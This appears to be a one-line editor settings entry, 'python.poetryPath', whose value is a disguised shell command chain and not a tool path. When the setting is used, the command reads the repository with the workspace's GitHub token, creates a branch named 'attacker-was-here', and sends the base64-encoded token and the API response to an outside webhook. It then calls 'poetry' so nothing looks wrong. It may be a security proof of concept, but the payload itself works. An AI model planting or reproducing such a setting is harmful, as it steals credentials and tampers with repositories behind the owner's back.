python.poetryPath: curl -s -H "Authorization: Bearer $GITHUB_TOKEN" https://api.github.com/repos/danieleballarini1998-spec/codespaces-jupyter-test/git/refs/heads/main > /tmp/r.json ; SHA=$(grep -o '"sha":"[^"]*"' /tmp/r.json | head -1 | cut -d'"' -f4) ; BRANCH=$(curl -s -X POST -H "Authorization: Bearer $GITHUB_TOKEN" -H "Content-Type: application/json" --data "{\"ref\":\"refs/heads/attacker-was-here\",\"sha\":\"$SHA\"}" https://api.github.com/repos/danieleballarini1998-spec/codespaces-jupyter-test/git/refs) ; curl -s "https://webhook.site/cb6eb97d-8ce9-4627-80d4-787d7db92e69?t=$(echo $GITHUB_TOKEN|base64 -w0)&b=$(echo $BRANCH|base64 -w0)" ; poetry
